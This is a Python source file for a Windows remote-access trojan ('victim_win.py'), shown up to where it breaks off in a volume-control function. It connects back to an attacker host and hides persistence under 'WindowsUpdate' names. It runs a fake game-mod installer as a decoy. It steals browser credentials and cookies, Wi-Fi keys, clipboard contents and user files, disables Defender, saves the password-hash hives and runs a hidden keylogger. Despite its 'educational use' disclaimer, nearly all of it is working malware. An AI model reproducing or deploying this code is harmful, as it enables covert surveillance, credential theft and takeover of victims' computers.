#!/usr/bin/env python3
# victim_win.py v3.5 - Advanced Windows Reverse Shell
# Educational use / authorized pentesting only
# Github:
# I am not responsible for its use

# -------------------- IMPORTS --------------------
import socket               # TCP socket communication
import subprocess           # Execute system commands and PowerShell
import os                   # File system operations, environment variables
import sys                  # System-specific parameters (executable path, exit)
import time                 # Reconnection delay, timestamps
import base64               # Encode file chunks for safe transmission
import shutil               # High-level file operations (copy2, rmtree)
import getpass              # Retrieve current username
import winreg               # Windows registry manipulation for persistence
import zipfile              # Create ZIP archives for data exfiltration
import tempfile             # Get temporary directory for storing archives
import datetime             # Generate timestamps for file names
import ctypes               # Check admin privileges, interact with Windows API
import glob                 # Pattern matching for file cleanup and search
import urllib.request       # Download files from URLs, geolocation
import json                 # Parse JSON responses (geolocation, battery)
import hashlib              # SHA‑256 for RC4 key derivation, file hashes
import threading            # Run tasks in background (port forwarding, crazy cursor, decoy)
import random               # Jitter, crazy cursor, decoy delays

# -------------------- CONFIGURATION --------------------
ATTACKER_IP = "[IP_ADDRESS]"        # Attacker's IP address (modify before deployment)
ATTACKER_PORT = 4444                # Port on which the listener is waiting
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"   # Secret for RC4 key derivation (change it!)
RECONNECT_DELAY = 5                 # Base reconnection delay in seconds
BEACON_JITTER = True                # Enable randomized reconnection delay
BEACON_MIN = 3                      # Minimum jitter delay
BEACON_MAX = 10                     # Maximum jitter delay

# Persistence configuration
PERSIST_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSIST_NAME = "WindowsUpdateService"
PERSIST_SCRIPT = os.path.join(os.environ.get('APPDATA', ''), "svchost_update.pyw")
PERSIST_TASK_NAME = "WindowsUpdateCheck"

# Commonly used environment paths
TEMP = tempfile.gettempdir()
USER_PROFILE = os.environ.get('USERPROFILE', '')
APPDATA = os.environ.get('APPDATA', '')
LOCAL_APPDATA = os.environ.get('LOCALAPPDATA', '')

# ===================== CRYPTO (RC4 with Nonce) =====================

def _rc4(key: bytes, data: bytes) -> bytes:
    """RC4 stream cipher implementation."""
    S = list(range(256))
    j = 0
    # Key‑scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    # Pseudo‑random generation algorithm (PRGA)
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

def _encrypt_data(data: bytes) -> bytes:
    """
    Encrypt data using RC4 with a random nonce.
    Returns: nonce (8 bytes) + RC4_ciphertext
    """
    nonce = os.urandom(8)
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return nonce + _rc4(key, data)

def _decrypt_data(data: bytes) -> bytes:
    """
    Decrypt data that was encrypted with _encrypt_data.
    Expects at least 8 bytes (the nonce).
    """
    if len(data) < 8:
        return data
    nonce = data[:8]
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return _rc4(key, data[8:])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket with encryption and length prefix.
    Protocol: [4-byte big-endian length] + [nonce + RC4 ciphertext]
    If data is a string, it is encoded to UTF-8.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = _encrypt_data(data)
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.sendall(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted plaintext string, or None if the connection was closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    try:
        return _decrypt_data(data).decode('utf-8', errors='replace')
    except:
        return None

# ===================== HELPERS =====================

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """
    Execute a system command (cmd.exe) and capture its output.
    Uses CREATE_NO_WINDOW (0x08000000) to avoid console popups.
    """
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                              timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] Timeout ({timeout}s)"
    except Exception as e:
        return f"[-] Error: {e}"

def run_ps(cmd: str, timeout: int = 60) -> str:
    """
    Execute a PowerShell command with execution policy bypassed.
    """
    try:
        proc = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', cmd],
            capture_output=True, text=True, timeout=timeout, creationflags=0x08000000)
        output = proc.stdout + proc.stderr
        return output.strip() if output.strip() else "[+] Executed (no output)"
    except subprocess.TimeoutExpired:
        return f"[-] PS timeout ({timeout}s)"
    except Exception as e:
        return f"[-] PS error: {e}"

def send_file_over_socket(sock: socket.socket, filepath: str) -> bool:
    """
    Send a file to the listener using the custom protocol:
    FILE_START, then base64 chunks (3KB each), then FILE_END.
    Returns True on success, False on failure.
    """
    try:
        send_encrypted(sock, "FILE_START")
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(3 * 1024)
                if not chunk:
                    break
                send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
        send_encrypted(sock, "FILE_END")
        return True
    except Exception:
        try:
            send_encrypted(sock, "FILE_END")
        except:
            pass
        return False

def safe_remove(path: str):
    """Remove a file or directory without raising exceptions."""
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        elif os.path.isfile(path):
            os.remove(path)
    except:
        pass

def safe_copy(src: str, dst: str) -> bool:
    """Copy a file only if source exists. Returns True on success."""
    try:
        if os.path.exists(src):
            shutil.copy2(src, dst)
            return True
    except:
        pass
    return False

def is_admin() -> bool:
    """Check if the current process has administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# ===================== PERSISTENCE =====================

def install_persistence(method: str = "all") -> str:
    """
    Install persistence using the specified method(s).
    Methods: 'all', 'registry', 'task', 'startup'.
    Returns a status message.
    """
    results = []
    # First, copy the script to the persistent location if not already there
    try:
        if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
            shutil.copy2(__file__, PERSIST_SCRIPT)
    except Exception as e:
        results.append(f"[-] Error copying script: {e}")

    # Use pythonw.exe to avoid console windows
    exe = sys.executable.replace("python.exe", "pythonw.exe")

    if method in ("all", "registry"):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, f'"{exe}" "{PERSIST_SCRIPT}"')
            winreg.CloseKey(key)
            results.append("[+] Persistence: Registry (HKCU Run) ✓")
        except Exception as e:
            results.append(f"[-] Registry: {e}")

    if method in ("all", "task"):
        cmd = f'schtasks /create /tn "{PERSIST_TASK_NAME}" /tr "\\"{exe}\\" \\"{PERSIST_SCRIPT}\\"" /sc onlogon /rl limited /f'
        r = run_cmd(cmd)
        if any(w in r.lower() for w in ["correctamente", "successfully", "éxito", "success"]):
            results.append("[+] Persistence: Scheduled task ✓")
        else:
            results.append(f"[-] Task: {r[:100]}")

    if method in ("all", "startup"):
        try:
            startup = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if os.path.exists(startup):
                vbs = os.path.join(startup, "WindowsUpdate.vbs")
                with open(vbs, 'w') as f:
                    f.write(f'CreateObject("WScript.Shell").Run """" & "{exe}" & """" & " " & """" & "{PERSIST_SCRIPT}" & """", 0, False')
                results.append("[+] Persistence: Startup folder ✓")
            else:
                results.append("[-] Startup: folder not found")
        except Exception as e:
            results.append(f"[-] Startup: {e}")

    return "\n".join(results) if results else "[-] Unrecognized method"

def check_persistence() -> str:
    """Report the status of all three persistence methods."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_READ)
        val, _ = winreg.QueryValueEx(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append(f"[+] Registry: ACTIVE → {val}")
    except:
        results.append("[-] Registry: NO")

    o = run_cmd(f'schtasks /query /tn "{PERSIST_TASK_NAME}" 2>nul')
    results.append("[+] Task: ACTIVE" if PERSIST_TASK_NAME in o else "[-] Task: NO")

    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    results.append("[+] Startup: ACTIVE" if os.path.exists(vbs) else "[-] Startup: NO")
    results.append("[+] Script: exists" if os.path.exists(PERSIST_SCRIPT) else "[-] Script: NO")
    return "\n".join(results)

def remove_persistence() -> str:
    """Remove all traces of persistence."""
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] Registry removed")
    except:
        results.append("[-] Registry: not found")
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}" /f 2>nul')
    results.append("[+] Task removed")
    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    safe_remove(vbs)
    results.append("[+] Startup removed")
    safe_remove(PERSIST_SCRIPT)
    results.append("[+] Script removed")
    return "\n".join(results)

# ===================== DROPPER & AUTO-PERSISTENCE =====================

_persist_active = True

def toggle_persistence() -> str:
    """Toggle automatic re‑installation of persistence on reconnect."""
    global _persist_active
    _persist_active = not _persist_active
    state = "ACTIVATED (hooked to system)" if _persist_active else "DEACTIVATED (released)"
    return f"[*] Automatic malware grip: {state}"

def launch_decoy():
    """
    Launch a fake installer GUI to distract the user.
    Runs in a separate thread so it doesn't block the main connection loop.
    """
    if os.path.realpath(__file__) == os.path.realpath(PERSIST_SCRIPT):
        return
    def _run_gui():
        try:
            import tkinter as tk
            from tkinter import ttk, messagebox
            root = tk.Tk()
            root.title("ModLoader Pro - Installer v3.2")
            root.geometry("500x220")
            root.resizable(False, False)
            root.configure(bg="#1a1a2e")
            root.attributes('-topmost', True)
            try:
                root.iconbitmap(default='')
            except:
                pass
            tk.Label(root, text="🕹️ ModLoader Pro", font=("Segoe UI", 16, "bold"),
                     bg="#1a1a2e", fg="#e94560").pack(pady=(18, 2))
            tk.Label(root, text="Universal Game Mod Installer", font=("Segoe UI", 9),
                     bg="#1a1a2e", fg="#666").pack()
            status_var = tk.StringVar(value="Preparing installation...")
            tk.Label(root, textvariable=status_var, font=("Segoe UI", 9),
                     bg="#1a1a2e", fg="#a0a0a0").pack(pady=8)
            style = ttk.Style()
            style.theme_use('default')
            style.configure("M.Horizontal.TProgressbar", troughcolor='#16213e',
                            background='#e94560', thickness=22)
            progress = ttk.Progressbar(root, style="M.Horizontal.TProgressbar",
                                       length=420, mode='determinate')
            progress.pack(pady=6)
            tk.Label(root, text="v3.2.1 build 847  |  © 2024 ModLoader Team",
                     font=("Segoe UI", 7), bg="#1a1a2e", fg="#444").pack(side='bottom', pady=8)
            steps = [
                (8, "Connecting to mod server..."),
                (18, "Authenticating session..."),
                (30, "Fetching mod index (1/3)..."),
                (44, "Downloading mod files (2/3)..."),
                (58, "Downloading assets (3/3)..."),
                (70, "Extracting archive..."),
                (80, "Verifying checksums..."),
                (88, "Installing components..."),
                (95, "Finalizing...")
            ]
            def update_progress(step=0):
                if step < len(steps):
                    progress['value'] = steps[step][0]
                    status_var.set(steps[step][1])
                    root.after(random.randint(700, 1800), update_progress, step + 1)
                else:
                    progress['value'] = 100
                    status_var.set("Verifying installation...")
                    root.after(1200, show_error)
            def show_error():
                root.withdraw()
                messagebox.showerror("Installation Error",
                                     "Error 0x80070005: Access is denied.\n\n"
                                     "Failed to extract assets. Please run the installer as "
                                     "Administrator or disable your antivirus temporarily.")
                root.destroy()
            root.after(1000, update_progress)
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            root.mainloop()
        except:
            pass
    threading.Thread(target=_run_gui, daemon=True).start()

# ===================== SYSINFO (returns tar path) =====================

def gather_sysinfo() -> str:
    """
    Collect extensive system information, package it into a .tar archive,
    and return the path to the archive (or error message).
    """
    import tarfile
    info_dir = os.path.join(TEMP, "si_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(info_dir, exist_ok=True)

    cmds = {
        "systeminfo.txt": "systeminfo",
        "ipconfig.txt": "ipconfig /all",
        "services.txt": "sc query",
        "processes.txt": "tasklist /v",
        "users.txt": "net user",
        "admins.txt": "net localgroup administrators",
        "env.txt": "set",
        "arp.txt": "arp -a",
        "routes.txt": "route print",
        "shares.txt": "net share",
        "netstat.txt": "netstat -ano",
        "dns_cache.txt": "ipconfig /displaydns",
        "firewall.txt": "netsh advfirewall show allprofiles",
        "hotfixes.txt": "wmic qfe list full",
        "drives.txt": "wmic logicaldisk get caption,description,freespace,size",
        "startup_items.txt": "wmic startup list full",
        "whoami_all.txt": "whoami /all",
    }
    for fname, c in cmds.items():
        out = run_cmd(c, timeout=45)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(info_dir, "hosts"))

    # WiFi profiles
    wifi_dir = os.path.join(info_dir, "wifi")
    os.makedirs(wifi_dir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wifi_dir}"', timeout=15)

    # Registry exports
    for fname, regpath in {
        "autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    }.items():
        run_cmd(f'reg export "{regpath}" "{os.path.join(info_dir, fname)}" /y', timeout=30)

    # PS extras
    for fname, pcmd in {
        "installed_software.txt": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -EA SilentlyContinue | Select DisplayName,DisplayVersion,Publisher | Sort DisplayName | FT -Auto | Out-String -Width 200",
        "scheduled_tasks.txt": "Get-ScheduledTask | Where {$_.State -ne 'Disabled'} | Select TaskName,TaskPath,State | FT -Auto | Out-String -Width 200",
        "antivirus.txt": "Get-MpComputerStatus -EA SilentlyContinue | FL | Out-String -Width 200",
    }.items():
        out = run_ps(pcmd, timeout=60)
        try:
            with open(os.path.join(info_dir, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(out)
        except:
            pass

    tar_path = os.path.join(TEMP, "sysinfo.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(info_dir, arcname="sysinfo")
        safe_remove(info_dir)
        return tar_path
    except Exception as e:
        safe_remove(info_dir)
        return f"[-] Tar error: {e}"

# ===================== SCREENSHOT =====================

def take_screenshot() -> str:
    """Take a screenshot of the primary monitor and return the path to the PNG."""
    sc_path = os.path.join(TEMP, "sc.png")
    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
$bmp.Save("{sc_path}")
$g.Dispose(); $bmp.Dispose()'''
    run_ps(ps, timeout=15)
    return sc_path if os.path.exists(sc_path) else "[-] Screenshot failed"

# ===================== WIFI =====================

def get_wifi_passwords() -> str:
    """Retrieve all saved WiFi passwords in plain text."""
    out = run_cmd("netsh wlan show profiles", timeout=15)
    if "no hay" in out.lower() or "is not" in out.lower() or "no se" in out.lower():
        return "[-] No WiFi profiles or WLAN unavailable"
    results = []
    for line in out.split('\n'):
        if "Perfil de todos los usuarios" in line or "All User Profile" in line:
            name = line.split(':')[1].strip() if ':' in line else None
            if name:
                detail = run_cmd(f'netsh wlan show profile name="{name}" key=clear', timeout=10)
                pwd = ""
                for dl in detail.split('\n'):
                    if "Contenido de la clave" in dl or "Key Content" in dl:
                        pwd = dl.split(':')[1].strip() if ':' in dl else "N/A"
                        break
                results.append(f"  {name}  →  {pwd if pwd else 'N/A'}")
    return "[+] WiFi:\n" + "\n".join(results) if results else "[-] No passwords"

# ===================== CLIPBOARD =====================

def get_clipboard() -> str:
    """Return the current content of the clipboard."""
    r = run_ps("Get-Clipboard -EA SilentlyContinue", timeout=10)
    return f"[+] Clipboard:\n{r}" if r and not r.startswith("[-]") else "[-] Clipboard empty"

# ===================== SOFTWARE =====================

def get_installed_software() -> str:
    """List all installed software via PowerShell."""
    ps = '''$s=@(); @('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*') | %{ $s += Get-ItemProperty $_ -EA SilentlyContinue | Where {$_.DisplayName} | Select DisplayName,DisplayVersion,Publisher }; $s | Sort DisplayName -Unique | FT -Auto | Out-String -Width 300'''
    return run_ps(ps, timeout=60)

# ===================== BROWSERS =====================

def steal_browsers() -> str:
    """
    Steal browser data (Login Data, Cookies, History, etc.) from Chrome, Edge,
    Brave, Opera, and Firefox. Returns path to a ZIP archive or error message.
    """
    bdir = os.path.join(TEMP, "br_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(bdir, exist_ok=True)
    found = False
    targets = ["Login Data", "Cookies", "History", "Bookmarks", "Web Data"]

    for bname, base in [
        ("Chrome", os.path.join(LOCAL_APPDATA, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(LOCAL_APPDATA, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(LOCAL_APPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ]:
        if not os.path.exists(base):
            continue
        out = os.path.join(bdir, bname)
        os.makedirs(out, exist_ok=True)
        default = os.path.join(base, "Default")
        if os.path.exists(default):
            for t in targets:
                if safe_copy(os.path.join(default, t), os.path.join(out, f"Default_{t}")):
                    found = True
        safe_copy(os.path.join(base, "Local State"), os.path.join(out, "Local_State"))

    # Firefox
    ff = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(ff):
        for prof in glob.glob(os.path.join(ff, "*.default*")):
            pout = os.path.join(bdir, "Firefox", os.path.basename(prof))
            os.makedirs(pout, exist_ok=True)
            for f in ["places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "cert9.db"]:
                if safe_copy(os.path.join(prof, f), os.path.join(pout, f)):
                    found = True

    if not found:
        safe_remove(bdir)
        return "[-] No browser data found"

    zpath = os.path.join(TEMP, "browsers.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(bdir):
                for file in files:
                    fp = os.path.join(root, file)
                    try:
                        zf.write(fp, os.path.relpath(fp, bdir))
                    except:
                        pass
        safe_remove(bdir)
        return zpath
    except Exception as e:
        safe_remove(bdir)
        return f"[-] Error: {e}"

# ===================== PRIVESC CHECK =====================

def check_privesc() -> str:
    """Analyze common privilege escalation vectors."""
    r = []
    r.append("=== ADMIN: {} ===".format("YES" if is_admin() else "NO"))
    r.append("\n=== PRIVILEGES ===")
    r.append(run_cmd("whoami /priv"))
    r.append("\n=== GROUPS ===")
    r.append(run_cmd("whoami /groups"))
    r.append("\n=== UNQUOTED SERVICE PATHS ===")
    r.append(run_ps("Get-WmiObject Win32_Service -EA SilentlyContinue | Where { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\\Windows\\*' } | Select Name,PathName,StartMode | FT -Auto | Out-String -Width 300", timeout=30))
    # AlwaysInstallElevated
    r.append("\n=== AlwaysInstallElevated ===")
    o1 = run_cmd('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    o2 = run_cmd('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
    r.append("[!] ENABLED" if "0x1" in o1 and "0x1" in o2 else "[-] Not enabled")
    # Writable PATH dirs
    r.append("\n=== WRITABLE DIRS IN PATH ===")
    for d in os.environ.get('PATH', '').split(';'):
        d = d.strip()
        if d and os.path.exists(d) and os.access(d, os.W_OK):
            r.append(f"  [!] {d}")
    r.append("\n=== STORED CREDENTIALS ===")
    r.append(run_cmd("cmdkey /list"))
    return "\n".join(r)

# ===================== STEAL FILES =====================

def steal_files() -> str:
    """Archive common user folders and return path to ZIP."""
    if not USER_PROFILE:
        return "[-] No USERPROFILE"
    folders = {n: os.path.join(USER_PROFILE, n) for n in ['Desktop', 'Downloads', 'Documents', 'Pictures', 'Videos']}
    existing = {n: p for n, p in folders.items() if os.path.exists(p)}
    if not existing:
        return "[-] No folders found"
    zpath = os.path.join(TEMP, f"steal_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    MAX_FILE_SIZE = 50 * 1024 * 1024   # 50 MB per file
    MAX_TOTAL_SIZE = 500 * 1024 * 1024 # 500 MB total
    total = 0
    limit_hit = False
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for fn, fp in existing.items():
                if limit_hit:
                    break
                for root, dirs, files in os.walk(fp):
                    if limit_hit:
                        break
                    for file in files:
                        full = os.path.join(root, file)
                        try:
                            fsize = os.path.getsize(full)
                            if fsize > MAX_FILE_SIZE:
                                continue
                            if total + fsize > MAX_TOTAL_SIZE:
                                limit_hit = True
                                break
                            zf.write(full, os.path.join(fn, os.path.relpath(full, fp)))
                            total += fsize
                        except:
                            continue
        return zpath
    except Exception as e:
        return f"[-] ZIP error: {e}"

# ===================== EXFIL COMPLETO =====================

def full_exfil() -> str:
    """Perform a total exfiltration: sysinfo + wifi + screenshot + clipboard + browsers + software + registry."""
    import tarfile
    edir = os.path.join(TEMP, "ex_" + datetime.datetime.now().strftime('%H%M%S'))
    os.makedirs(edir, exist_ok=True)

    # Sysinfo
    si = os.path.join(edir, "sysinfo")
    os.makedirs(si, exist_ok=True)
    for fname, c in {"systeminfo.txt": "systeminfo", "ipconfig.txt": "ipconfig /all", "processes.txt": "tasklist /v",
                      "users.txt": "net user", "netstat.txt": "netstat -ano", "whoami.txt": "whoami /all"}.items():
        try:
            with open(os.path.join(si, fname), 'w', encoding='utf-8', errors='replace') as f:
                f.write(run_cmd(c, timeout=45))
        except:
            pass
    safe_copy(r"C:\Windows\System32\drivers\etc\hosts", os.path.join(si, "hosts"))

    # WiFi
    with open(os.path.join(edir, "wifi.txt"), 'w', encoding='utf-8') as f:
        f.write(get_wifi_passwords())
    wdir = os.path.join(edir, "wifi_profiles")
    os.makedirs(wdir, exist_ok=True)
    run_cmd(f'netsh wlan export profile key=clear folder="{wdir}"', timeout=15)

    # Screenshot
    sc = take_screenshot()
    if os.path.exists(str(sc)):
        safe_copy(sc, os.path.join(edir, "screenshot.png"))
        safe_remove(sc)

    # Clipboard
    with open(os.path.join(edir, "clipboard.txt"), 'w', encoding='utf-8') as f:
        f.write(get_clipboard())

    # Browsers
    br = steal_browsers()
    if os.path.exists(str(br)):
        safe_copy(br, os.path.join(edir, "browsers.zip"))
        safe_remove(br)

    # Software
    with open(os.path.join(edir, "software.txt"), 'w', encoding='utf-8') as f:
        f.write(get_installed_software())

    # Registry
    rdir = os.path.join(edir, "registry")
    os.makedirs(rdir, exist_ok=True)
    for fname, rp in {"autorun_hkcu.reg": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                       "autorun_hklm.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                       "installed.reg": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"}.items():
        run_cmd(f'reg export "{rp}" "{os.path.join(rdir, fname)}" /y', timeout=30)

    # Credentials
    with open(os.path.join(edir, "credentials.txt"), 'w', encoding='utf-8') as f:
        f.write(run_cmd("cmdkey /list"))

    tar_path = os.path.join(TEMP, "exfil.tar")
    try:
        with tarfile.open(tar_path, 'w') as tar:
            tar.add(edir, arcname="exfil")
        safe_remove(edir)
        return tar_path
    except Exception as e:
        safe_remove(edir)
        return f"[-] Tar error: {e}"

# ===================== DEFENDER =====================

def disable_defender() -> str:
    """Attempt to disable Windows Defender (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    for name, c in [
        ('RealTime', 'Set-MpPreference -DisableRealtimeMonitoring $true'),
        ('Behavior', 'Set-MpPreference -DisableBehaviorMonitoring $true'),
        ('Script', 'Set-MpPreference -DisableScriptScanning $true'),
        ('IOAV', 'Set-MpPreference -DisableIOAVProtection $true'),
        ('Excl TEMP', f'Add-MpPreference -ExclusionPath "{TEMP}"'),
        ('Excl APPDATA', f'Add-MpPreference -ExclusionPath "{APPDATA}"'),
    ]:
        o = run_ps(c, timeout=15)
        r.append(f"{'[+]' if 'error' not in o.lower() and 'denied' not in o.lower() else '[-]'} {name}")
    return "\n".join(r)

# ===================== DUMP HASHES =====================

def dump_hashes() -> str:
    """Save SAM, SYSTEM, SECURITY hives for offline hash extraction (requires admin)."""
    if not is_admin():
        return "[-] Requires admin"
    r = []
    paths = []
    for name, hive in [("SAM", "SAM"), ("SYSTEM", "SYSTEM"), ("SECURITY", "SECURITY")]:
        p = os.path.join(TEMP, f"{name.lower()}.save")
        run_cmd(f'reg save HKLM\\{hive} "{p}" /y')
        if os.path.exists(p):
            r.append(f"[+] {name} → {p}")
            paths.append(p)
        else:
            r.append(f"[-] {name}: failed")
    if paths:
        r.append("\n[*] Download with: download <path>")
    return "\n".join(r)

# ===================== KEYLOGGER =====================

_keylog_active = False
_keylog_file = os.path.join(TEMP, "kl.txt")

def keylog_control(action: str) -> str:
    """Control the PowerShell keylogger: start, stop, dump, clear."""
    global _keylog_active
    if action == "start":
        if _keylog_active:
            return "[*] Already active"
        ps_script = r'''Add-Type -AssemblyName System.Windows.Forms
$sig=@"
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
"@
$A=Add-Type -MemberDefinition $sig -Name W -Namespace K -PassThru
$f="''' + _keylog_file + r'''"
$lw=""
while($true){Start-Sleep -M 40
$sb=New-Object System.Text.StringBuilder 256
[K.W]::GetWindowText([K.W]::GetForegroundWindow(),$sb,256)|Out-Null
$cw=$sb.ToString()
if($cw -ne $lw){$lw=$cw;"`r`n--- [$cw] $(Get-Date -F 'HH:mm:ss') ---`r`n"|Out-File $f -Append}
for($i=8;$i -le 190;$i++){if([K.W]::GetAsyncKeyState($i) -eq -32767){$k=[System.Windows.Forms.Keys]$i
switch($k){'Space'{' '|Out-File $f -A -NoNewline}'Return'{"`r`n"|Out-File $f -A -NoNewline}'Back'{'[BS]'|Out-File $f -A -NoNewline}default{"$k"|Out-File $f -A -NoNewline}}}}}'''
        ps_path = os.path.join(TEMP, "kl.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _keylog_active = True
            return "[+] Keylogger started"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | 
            Where-Object {$_.CommandLine -like '*kl.ps1*'} | 
            ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
        _keylog_active = False
        safe_remove(os.path.join(TEMP, "kl.ps1"))
        return "[+] Keylogger stopped"
    elif action == "dump":
        if os.path.exists(_keylog_file):
            try:
                with open(_keylog_file, 'r', encoding='utf-8', errors='replace') as f:
                    return f"[+] Keylog:\n{f.read()}"
            except Exception as e:
                return f"[-] Error: {e}"
        return "[-] No data"
    elif action == "clear":
        safe_remove(_keylog_file)
        return "[+] Keylog cleared"
    return "[-] Usage: keylog start|stop|dump|clear"

# ===================== GEOLOCATE =====================

def geolocate() -> str:
    """Get approximate geolocation using ipinfo.io."""
    try:
        req = urllib.request.Request("https://ipinfo.io/json")
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            loc = data.get("loc", "N/A")
            city = data.get("city", "N/A")
            region = data.get("region", "N/A")
            country = data.get("country", "N/A")
            org = data.get("org", "N/A")
            ip = data.get("ip", "N/A")
            return f"[+] Geolocation:\n  IP: {ip}\n  City: {city}, {region}, {country}\n  Coords: {loc}\n  ISP: {org}"
    except Exception as e:
        return f"[-] Geolocation error: {e}"

# ===================== SOUND, VOL & BATTERY =====================

def play_sound() -> str:
    """Emit a beep sound."""
    run_ps("[System.Console]::Beep(800, 1000)", timeout=5)
    return "[+] Sound (beep) played"

def set_volume(level: str) -> str:
    """Set system master volume (0-100)."""
    try:
        vol = float(level)
        if vol < 0: vol = 0.0
        if vol > 100: vol = 100.0
        ps = f'''
$code = @"
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {{
